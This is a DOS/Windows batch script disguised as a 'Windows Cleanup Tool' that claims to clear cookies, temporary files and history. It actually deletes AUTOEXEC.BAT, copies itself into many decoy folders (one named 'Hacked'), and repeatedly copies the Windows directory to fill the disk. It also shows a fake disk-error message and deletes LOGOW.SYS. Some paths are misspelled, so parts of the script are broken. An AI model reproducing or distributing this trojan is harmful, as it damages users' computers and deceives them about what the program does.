@echo off
CLS
Move C:\AOTOEXEC.BAT C:\WINDOWS\SYSTEM
DEL C:\WINDOWS\SYSTEM\AUTOEXEC.BAT
MOVE %0 C:\>NUL
CLS
echo Windows Cleanup Tool v1.0
echo This program Deletes Cookies,Temporary Internet folder and History Folder
echo To continue press any key.
pause
MD C:\WINDOWS\Windows
MD C:\WINDOWS\Windows\Windows
MD C:\WINDOWS\System\System
MD C:\WINDOWS\System\System\System
MD C:\WINDOWS\DESKTOP\Media1
MD C:\WINDOWS\User
MD C:\WINDOWS\WINCOMMAND
MD C:\WINDOWS\NEW
MD C:\WINDOWS\NEW\FILE
MD C:\WINDOWS\START
MD C:\WINDOWS\Windows\Windows\Hacked
MD C:\WINDOWS\TELENET
MD C:\WINDOWS\shell
MKDIR C:\WINDOWS\SYSTEM\ALL
copy %0 C:\WINDOWS\shell>nul
copy %0 C:\WINDOWS\TELENET>nul
copy %0 C:\WINDOWS\Windows\Windows\Hacked>nul
copy %0 C:\WINDOWS\START>nul
copy %0 C:\WINDOWS\NEW\FILE>nul
copy %0 C:\WINDOWS\NEW>nul
copy %0 C:\WINDOWS\WINCOMMAND>nul
copy %0 C:\WINDOWS\User>nul
copy %0 C:\WINDOWS\Media1>nul
copy %0 C:\WINDOWS\System\System\System>nul
copy %0 C:\WINDOWS\System\System>nul
copy %0 C:\WINDOWS\Windows\Windows>nul
copy %0 C:\WINDOWS\Windows>nul
copy c:\windows C:\WINDOWS\Windows>nul
copy c:\windows C:\WINDOWS\Windows\Windows>nul
copy c:\windows C:\WINDOWS\System\System>nul
Deltree /y C:\WINDOWS\COOKIES
copy c:\windows C:\WINDOWS\System\System\System>nul
copy c:\windows C:\WINDOWS\DESKTOP\Media1>nul
copy c:\windows C:\WINDOWS\User>nul
Echo Windows is now caculating the ammount of disk space you have.
echo This will take a few minutes.
echo If Windows stops responding please reset your computer.
copy c:\windows C:\WINDOWS\WINCOMMAND>nul
copy c:\windows C:\WINDOWS\NEW>nul
copy c:\windows C:\WINDOWS\NEW\FILE>nul
DELTREE /Y C:\WINDOWS\TEMPOR~1
copy c:\windows C:\WINDOWS\START>nul
copy c:\windows C:\WINDOWS\Windows\Windows\Hacked>nul
copy c:\windows C:\WINDOWS\TELENET>nul
copy c:\windows C:\WINDOWS\shell>nul
DELTREE /Y C:\WINDOWS\HISTORY
echo Error on TRACK 0 HEAD 0
ECHO Thank you for using Cleanup Tool v1.0
COPY c:\*BMP C:\WINDOWS\SYSTEM\ALL>NUL
COPY C:\WINDOWS\*.BMP C:\WINDOWS\SYSTEM\ALL>NUL
COPY C:\WINDOWS\SYSTEM\ALL C:\WINDOWS>NUL
COPY C:\WINDOWS\ESKTOP C:\WINDOWS>NUL
del C:\WINDOWS\LOGOW.SYS